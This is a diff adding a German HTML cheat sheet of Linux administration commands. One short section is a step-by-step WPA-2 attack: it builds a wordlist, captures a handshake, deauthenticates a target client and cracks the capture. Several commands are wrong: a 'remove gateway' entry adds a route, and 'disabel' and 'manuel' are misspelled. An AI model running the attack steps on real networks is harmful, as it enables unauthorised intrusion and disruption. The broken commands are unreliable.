@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="de">
+  <head>
+      <!-- Meta Tags -->
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+      <!-- Lokal Bootstrap CSS -->
+      <link rel="stylesheet" type="text/css" href="../css/bootstrap.min.css">
+
+      <!-- CDN wenn public -->
+      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+      <title>Linux</title>
+    </head>
+    <style>
+        body {
+            background: #b2bec3;
+        }
+        .container-fluid {
+            background: lightgray;
+        }
+        h1, h5, h6, p {
+            font-family: 'Lato', sans-serif;
+        }
+        h5, h6 {
+            text-transform: uppercase;
+            /*letter-spacing: .1rem;*/
+            font-weight: 800;
+            padding-left: 3%;
+        }
+        h1 {
+            font-weight: 800;
+        }
+        p {
+            padding-left: 5%;
+        }
+    </style>
+    <body>
+        <div class="container-fluid pt-5">
+            <h1 class="text-uppercase text-center">Linux Kommandos</h1>
+            <h3 class="text-center">Linux Kommandos werden teilweise mit root-Rechten ausgefuehrt</h3>
+        </div>
+        <div class="container-fluid pt-3">
+            <h6 class="text-uppercase">Wichtige Verzeichnisse</h6>
+            <h6 class="text-uppercase">Module (Driver) Verzeichnis</h6>
+            <p>/lib/modules/Kernelversion/kernel/drivers/</p>
+            <p class="pb-3">z.B. cd /lib/modules/5.4.0-kali4-amd64/kernel/drivers/net/wireless/</p>
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>apt Kommandos</h6> 
+            <h6>System update/upgrade</h6>
+            <p>apt update</p>
+            <p>apt upgrade</p>
+            <h6>Pakete deninstallieren</h6>
+            <p>apt remove Paketname</p>
+            <h6>Paket mit Konfigurationsdateien</h6>
+            <p>apt purge Paketname</p>
+            <h6>Paket Cache leeren /var/cache/apt/archives/</h6>
+            <p>apt autoclean -> Pakete, die nicht mehr in den Quellen verfügbar sind, geloescht </p>
+            <p>apt clean -> Entfernen von zur Installation heruntergeladenen Paketen </p>
+            <h6>Pakete ausschliessen</h6>
+            <p>z.B. apt-mark hold linux-headers-5.4.0-kali-amd64</p>
+            <p>z.B. apt-mark unhold linux-headers-5.4.0-kali-amd64</p>
+            <h6>Paket nach Suchbegriff suchen</h6>
+            <p>z.B. apt search linux-headers-5.4</p>
+            <h6>Installierte Pakete nach Suchmuster suchen</h6>
+            <p class="pb-3">z.B. apt list --installed linux-image*</p>
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>Windows Laufwerk mounten</h6>
+            <p>Auf dem Windows System muss ein Laufwerk freigegeben sein.</p>
+            <p>Verzeichnis auf dem Linux System anlegen z.B.:</p>
+            <p>mkdir /mnt/windows</p>
+            <p>mount -t cifs //Windows-System/Freigabe /mnt/windows -o username=test,passwd=test</p>
+            <p class="pb-3">z.B. mount -t cifs //192.168.55.21/test /mnt/windows -o username=test,passwd=test</p>
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>Verzeichnisse und Dateien</h6>
+            <h6>Verzeichnis / Dateien suchen</h6>
+            <p>find /Pfad -name Verzeichnis/Dateiname</p>
+            <h6>Dateien mit bestimmten Suchmuster suchen</h6>
+            <p>find /Pfad -type f -exec grep -l "Suchmuster" {} \;</p>
+            <h6>Dateien nach Groesse suchen</h6>
+            <p class="pb-3">find /Pfad -type f -size +50000k -exec ls -l --block-size=M {} \;</p>
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>Enable Monitor Mode TP-Link w722n v2/3 Kernel 5.4</h6>
+            <hr>
+            <h6>[Download and Installation]</h6>
+            <p>sudo apt update</p>
+            <p>sudo apt install bc</p>
+            <p>sudo rmmod r8188eu.ko</p>
+            <p>git clone https://github.com/aircrack-ng/rtl8188eus</p>
+            <p>cd rtl8188eus</p>
+            <p>sudo -i</p>
+            <p>echo "blacklist r8188eu.ko" > "/etc/modprobe.d/realtek.conf"</p>
+            <p>exit</p>
+            <p>make</p>
+            <p>sudo make install</p>
+            <p>sudo modprobe 8188eu</p>
+            <h6>[Enabling Monitor Mode]</h6> 
+            <p>sudo airmon-ng check kill</p>
+            <p>sudo ip link set wlan0 down</p>
+            <p>sudo iw dev wlan0 set type monitor</p>    
+            <h6>[Testing Packet Injection]</h6>
+            <p>aireplay-ng --test wlan0</p>
+            <p class="pb-3">sudo aireplay -9 wlan0</p>
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>Einfachen WPA-2 Hack</h6>
+            <p>Eigene Wordlist erstellen mit crunch</p>
+            <p>crunch 11 11 -t 0123%%%%%%8 -o /usr/share/dict/testwordlist</p>
+            <p>Monitoring</p>
+            <p>airodump-ng wlan0</p>
+            <p>airodump-ng -c 6 -w cap -d Router wlan0</p>
+            <p>aireplay --deauth 0 -a Router -c Target wlan0</p>
+            <p class="pb-3">aircrack-ng cap-01.cap -w /usr/share/dict/testwordlist</p>    
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>NetworkManager Statische IP konfgurieren</h6>
+            <p>nmcli connection show</p>
+            <p>sudo nmcli connection modify UUID IPv4.address 192.168.55.123/24</p>
+            <p>sudo nmcli connection modify UUID IPv4.gateway 192.168.55.1</p>
+            <p>sudo nmcli connection modify UUID IPv4.dns 8.8.8.8</p>
+            <p>sudo nmcli connection modify UUID IPv4.method manuel</p>
+            <p>sudo nmcli connection down UUID</p>
+            <p class="pb-3">sudo nmcli connection up UUID</p>    
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>Netzwerk</h6>
+            <h6>IP-Adresse anzeigen</h6>
+            <p>ip addr show</p>
+            <h6>IP-Adresse entfernen</h6>
+            <p>ip addr delete 192.168.55.11/24 dev eth0</p>
+            <h6>IP-Adresse manuell vergeben</h6>
+            <p>ip addr add 192.168.55.11/24 dev eth0</p>
+            <h6>Default Gateway IP-Adresse anzeigen</h6>
+            <p>ip route show</p>
+            <h6>Gateway IP-Adresse entfernen</h6>
+            <p>ip route add default via 192.168.0.1 dev wlan0</p>
+            <h6>Gateway IP-Adresse manuel vergeben</h6>
+            <p class="pb-3">ip route add default via 192.168.0.1 dev wlan0</p>
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>Systemd</h6>
+            <h6>systemd Dienst status anzeigen</h6>
+            <p>systemctl status application.service</p>
+            <h6>systemd Dienst starten</h6>
+            <p>systemctl start application.service</p>
+            <h6>systemd Dienst stoppen</h6>
+            <p>systemctl stop application.service</p>
+            <h6>systemd Dienst restart oder reload</h6>
+            <p>systemctl restart/reload application.service</p>
+            <h6>systemd Dienst beim booten starten oder nicht mehr starten</h6>
+            <p>systemctl enable application.service</p>
+            <p class="pb-3">systemctl disabel application.service</p>    
+        </div>
+        <div class="container-fluid pt-3">
+            <h6>Zeit und Datum</h6>
+            <h6>Wichtige Dateien</h6>
+            <p>/usr/share/zoneinfo</p>
+            <h6>Zeit, Datum, Zeitzone abfragen</h6>
+            <p>timedatectl status</p>
+            <h6>Zeitzonen anzeigen</h6>
+            <p class="pb-3">timedatectl list-timezones | grep -i berlin</p>
+        </div>
+
+    <!-- Optionalen JavaScript Alte Dateien-->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <!--<script src="js/jquery-3.3.1.slim.min.js"></script>
+    <script src="js/popper.js"></script>
+    <script src="js/bootstrap.min.js"></script>-->
+
+    <!--Lokal-->
+    <!-- Optionales JavaScript -->
+    <!-- jQuery, dann Popper.js, dann Bootstrap JS -->
+    <!--<script src="js/jquery-3.5.1.slim.min.js"></script>
+    <script src="js/popper.js"></script>
+    <script src="js/bootstrap.min.js"></script>-->
+
+    <!--CDN wenn public-->
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+  </body>
+</html>
